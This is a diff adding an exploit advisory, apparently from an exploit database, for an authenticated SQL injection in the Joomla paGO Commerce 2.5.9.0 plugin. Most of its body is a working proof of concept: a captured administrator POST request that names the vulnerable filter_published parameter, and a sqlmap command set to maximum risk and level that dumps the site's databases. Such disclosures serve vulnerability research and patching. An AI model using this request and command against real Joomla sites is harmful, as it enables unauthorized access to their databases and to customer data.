@@ -1,0 +1,40 @@
+# Exploit Title: Joomla! paGO Commerce 2.5.9.0 - SQL Injection (Authenticated)
+# Date: 2020-08-21
+# Exploit Author: Mehmet Kelepçe / Gais Cyber Security
+# Author ID: 8763
+# Vendor Homepage: https://www.corephp.com/
+# Software Link: https://www.corephp.com/joomla-products/pago-commerce
+# Version: 2.5.9.0
+# Tested on: Apache2
+
+Vulnerable param: filter_published
+-------------------------------------------------------------------------
+POST /joomla/administrator/index.php?option=com_pago&view=comments HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 163
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/joomla/administrator/index.php?option=com_pago&view=comments
+Cookie: 4bde113dfc9bf88a13de3b5b9eabe495=sp6rp5mqnihh2i323r57cvesoe; crisp-client%2Fsession%2F0ac26dbb-4c2f-490e-88b2-7292834ac0e9=session_a9697dd7-152d-4b1f-a324-3add3619b1e1
+Upgrade-Insecure-Requests: 1
+
+filter_search=&limit=10&filter_published=1&task=&controller=comments&boxchecked=0&filter_order=id&filter_order_Dir=desc&5a672ab408523f68032b7bdcd7d4bb5c=1
+
+-------------------------------------------------------------------------
+sqlmap poc:
+
+sqlmap -r pago --dbs --risk=3 --level=5 --random-agent -p filter_published
+
+
+[Gais Security]<https://www.gaissecurity.com>
+[Gais Security]
+[Gais Security]
+
+Mehmet KELEPÇE
+
+Penetration Tester | Red Team
